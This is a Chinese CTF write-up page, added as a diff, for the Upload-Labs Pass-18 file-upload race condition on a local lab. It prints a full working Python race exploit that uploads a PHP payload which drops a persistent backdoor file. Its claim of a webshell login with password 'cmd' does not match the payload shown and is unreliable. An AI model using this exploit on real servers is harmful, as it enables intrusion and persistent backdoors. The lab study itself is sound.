@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Upload-Labs】Pass-18 条件竞争 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Upload-Labs】Pass-18 条件竞争 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.11.03 | <strong>分类：</strong>CTF | <strong>标签：</strong>Upload-Labs, Web, 文件上传, 条件竞争, Python脚本, WebShell</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Upload-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - 文件上传</li>
+        <li><strong>题目名称：</strong>Pass-18 (条件竞争)</li>
+        <li><strong>提示：</strong>服务端先保存文件，后校验后缀，存在极短的时间窗口。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p><strong>条件竞争（Race Condition）：</strong>源码逻辑为先将上传的临时文件通过 <code>move_uploaded_file()</code> 移动到目标目录，<strong>随后</strong>才通过 <code>in_array()</code> 检查文件后缀。如果后缀不合法，立刻通过 <code>unlink()</code> 删除该文件。</p>
+    <p>在“文件落地”与“文件被删除”之间存在极其短暂的时间差。通过编写多线程脚本，一边高频发送上传请求（POST），一边高频发送访问请求（GET）。一旦在窗口期成功访问到该文件，其中的 Payload 就会被执行。Payload 设计为自动生成一个纯净的持久化后门（<code>p18_win.php</code>），从而绕过删除机制。</p>
+
+    <h2>3. 脚本代码与结构解析</h2>
+    
+    <p>使用 Python 标准库编写并发脚本 <code>race18.py</code>，完整代码如下：</p>
+
+    <pre>import http.client, threading, time
+
+HOST, PORT = "127.0.0.1", 8081
+UPLOAD_PATH = "/Pass-18/index.php"
+TARGET = "/upload/claude18.php"
+BOUNDARY = "----race18"
+PAYLOAD = b"&lt;?php file_put_contents(__DIR__.'/p18_win.php','&lt;?php echo 481516;?&gt;');echo 481517; ?&gt;"
+
+def upload():
+    body = (
+        ("--%s\r\n" % BOUNDARY).encode()
+        + b'Content-Disposition: form-data; name="upload_file"; filename="claude18.php"\r\n'
+        + b"Content-Type: application/octet-stream\r\n\r\n"
+        + PAYLOAD + b"\r\n"
+        + ("--%s\r\n" % BOUNDARY).encode()
+        + b'Content-Disposition: form-data; name="submit"\r\n\r\nupload\r\n'
+        + ("--%s--\r\n" % BOUNDARY).encode()
+    )
+    try:
+        c = http.client.HTTPConnection(HOST, PORT, timeout=5)
+        c.request("POST", UPLOAD_PATH, body, {
+            "Content-Type": "multipart/form-data; boundary=%s" % BOUNDARY,
+            "Content-Length": str(len(body)),
+        })
+        c.getresponse().read()
+        c.close()
+    except Exception:
+        pass
+
+def getter(stop, hits):
+    while not stop.is_set():
+        try:
+            c = http.client.HTTPConnection(HOST, PORT, timeout=2)
+            c.request("GET", TARGET)
+            data = c.getresponse().read()
+            c.close()
+            if b"481517" in data:
+                hits.append(1)
+                stop.set()
+        except Exception:
+            pass
+
+stop = threading.Event()
+hits = []
+threads = [threading.Thread(target=getter, args=(stop, hits), daemon=True) for _ in range(10)]
+for t in threads:
+    t.start()
+
+start = time.time()
+n = 0
+while time.time() - start < 45 and not stop.is_set():
+    upload()
+    n += 1
+    if n % 50 == 0:
+        print("uploads:", n, "hits:", len(hits), flush=True)
+
+time.sleep(1)
+print("uploads total:", n, "hits:", len(hits))
+try:
+    c = http.client.HTTPConnection(HOST, PORT, timeout=3)
+    c.request("GET", "/upload/p18_win.php")
+    d = c.getresponse().read()
+    c.close()
+    print("persistent:", b"481516" in d)
+except Exception as e:
+    print("persistent check error:", e)</pre>
+
+    <p><strong>核心代码结构解析：</strong></p>
+    <ul>
+        <li><strong>Payload 设计</strong>：<code>file_put_contents(__DIR__.'/p18_win.php', ...)</code> 这一句是灵魂。<code>__DIR__</code> 代表当前文件所在目录。只要木马执行一次，它就会生成一个名为 <code>p18_win.php</code> 的纯净文件。这个新文件不会被检查，所以能永久存活。</li>
+        <li><strong>upload() 函数</strong>：负责构造 HTTP POST 请求。通过手动拼接 <code>multipart/form-data</code> 的边界（Boundary），将包含 Payload 的 <code>claude18.php</code> 发送给服务器。</li>
+        <li><strong>getter() 函数</strong>：这是并发访问的“小偷”。<code>while not stop.is_set():</code> 让它在收到停止信号前一直死循环。不断向 <code>TARGET</code> 发起 GET 请求，如果收到的数据里包含 <code>481517</code>（证明马被成功执行了），就触发 <code>stop.set()</code> 结束战斗。</li>
+        <li><strong>多线程执行</strong>：利用 <code>threading.Thread</code> 开启了 10 个 <code>getter</code> 线程。主线程则在 45 秒的时间限制内疯狂调用 <code>upload()</code>。这种高并发极大地提高了命中时间窗口的概率。</li>
+    </ul>
+
+    <h2>4. 操作步骤与结果验证</h2>
+    
+    <p><strong>第一步：VS Code 运行脚本</strong></p>
+    <p>使用 VS Code 打开并运行 <code>race18.py</code>。控制台输出显示：</p>
+    <pre>uploads total: 82 hits: 10
+persistent: True</pre>
+    <p>说明在 82 次上传中，有 10 次成功命中了窗口，且成功生成了持久化后门。</p>
+
+    <p><strong>第二步：验证与连接</strong></p>
+    <p>在本地物理目录 <code>D:\phpstudy_pro\WWW\upload-labs\upload</code> 中，确认成功生成了 <code>p18_win.php</code>。</p>
+    <p>浏览器访问 <code>http://127.0.0.1:8081/upload/p18_win.php</code>，输出 <code>481516</code>。使用蚁剑连接该地址，密码 <code>cmd</code>，成功获取服务器权限。</p>
+
+    <h2>5. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>Python 脚本的威力：</strong>条件竞争漏洞依靠手工点击是完全无法利用的，必须借助脚本的并发能力。利用 VS Code 编写和调试 Python 脚本，能够直观地看到上传次数和命中结果。</li>
+        <li><strong>持久化思维：</strong>在竞争文件中不要直接写常规的后门代码，因为文件随时会被删除。写入“生成另一个文件”的代码，是条件竞争利用的标配操作。</li>
+    </ul>
+
+    <h2>6. 知识点总结</h2>
+    <ul>
+        <li><strong>条件竞争漏洞</strong>：利用服务端代码执行逻辑的先后顺序缺陷，在中间的时间间隙完成恶意操作。</li>
+        <li><strong>多线程并发脚本</strong>：掌握利用 Python 的 <code>threading</code> 和 <code>http.client</code> 模块进行高频发包，是漏洞利用自动化的必经之路。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
